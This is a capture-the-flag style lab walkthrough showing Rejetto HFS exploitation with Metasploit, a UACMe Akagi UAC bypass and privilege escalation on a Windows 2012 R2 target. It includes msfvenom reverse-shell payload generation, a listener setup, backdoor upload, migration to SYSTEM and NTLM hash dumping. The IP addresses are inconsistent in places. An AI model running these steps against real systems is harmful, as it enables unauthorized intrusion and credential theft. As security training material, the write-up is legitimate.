# 🔬UAC Bypass

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> 🔬 [UAC Bypass: UACMe](https://attackdefense.com/challengedetailsnoauth?cid=2208)
>
> * Target IP: `10.4.17.63`
> * Local IP: `10.10.16.2`
> * **UAC** bypass

### Enumeration

```bash
nmap 10.0.17.63
```

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-05 12:55 IST
Nmap scan report for 10.0.17.63
Host is up (0.0019s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
```

* Determine the version information of the web server on port `80`

```bash
nmap -sV -p 80 10.0.17.63
```

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-05 12:57 IST
Nmap scan report for 10.0.17.63
Host is up (0.0019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```

The version can be checked in a browser by opening the link

* `http://10.4.17.63/`

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
searchsploit hfs
```

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

* Run `metasploit` without showing banner
* Set the target IP as **GLOBAL RHOSTS variable**

```bash
msfconsole -q
msf6 > setg RHOSTS 10.0.17.63
```

```bash
msf6 > search hfs
msf6 > use exploit/windows/http/rejetto_hfs_exec
# direct exploit since the RHOSTS has been set globally (can check with show options)
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Use `meterpreter` commands to gain more information about the target

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Migrate current x86 `meterpreter` session to a x64 process

<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Get `admin` user privileges

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Privileges are very few which indicates that this user is not privileged at this point&#x20;

<figure><img src="../../../../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Do not have permission to elevate privileges

* Verify if `admin` user is part of the local administrators group

```bash
meterpreter > shell
C:\Windows\system32>net user
C:\Windows\system32>net localgroup administrators
```

<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> The admin user is a member of the Administrators group. However, it do not have the high privilege as of now.&#x20;



<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In order to run programs or tasks with elevated privileges, `UAC` bypass is necessary

### UAC Bypass & Privesc <a href="#uac-bypass-and-privesc" id="uac-bypass-and-privesc"></a>

* [UACMe Akagi](https://github.com/hfiref0x/UACME/tree/master/Source/Akagi) executable is already present on the attack machine

```bash
root@attackdefense:~# ls /root/Desktop/tools/UACME/
Akagi64.exe
```

<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Generate a `meterpreter` payload with `msfvenom`

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f exe > backdoor.exe
```

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Set up a new `msfconsole` session and set up a listener with `multi/handler`, to receive the connection one the payload is executed on the target

* set the payload used with `msfvenom` - the `windows/meterpreter/reverse_tcp` one
* set the `LHOST` IP and `LPORT` of the attack machine, based on the `msfvenom` generated payload

```bash
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.4.2
set LPORT 1234
run
```

* The `reverse_tcp handler` is listening and ready to receive the connection from the malicious payload
* Head back in the `meterpreter` session already opened

```bash
cd C:\\
mkdir Temp
cd Temp
# or use
# cd C:\\Users\\admin\\AppData\\Local\\Temp

upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
```

<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* UAC would prevent running `backdoor.exe`
* Run `Akagi64.exe` executable with UACMe method 23

<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

* Elevated `meterpreter` session should be received on the listener

<figure><img src="../../../../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
meterpreter > getuid
meterpreter > getprivs
```

The privileges amount has increased.

<figure><img src="../../../../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Migrate to a `NT AUTHORITY\SYSTEM` service.

```bash
meterpreter > ps
```

<figure><img src="../../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
meterpreter > ps
meterpreter > migrate 508 
```

<figure><img src="../../../../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> **Privileges successfully elevated** by bypassing UAC on a system running Windows 2012 R2.

<figure><img src="../../../../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
hashdump

admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64bb1d822f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

{% hint style="success" %}
Flag: `4d6583ed4cef81c2f2ac3c88fc5f3da6`
{% endhint %}

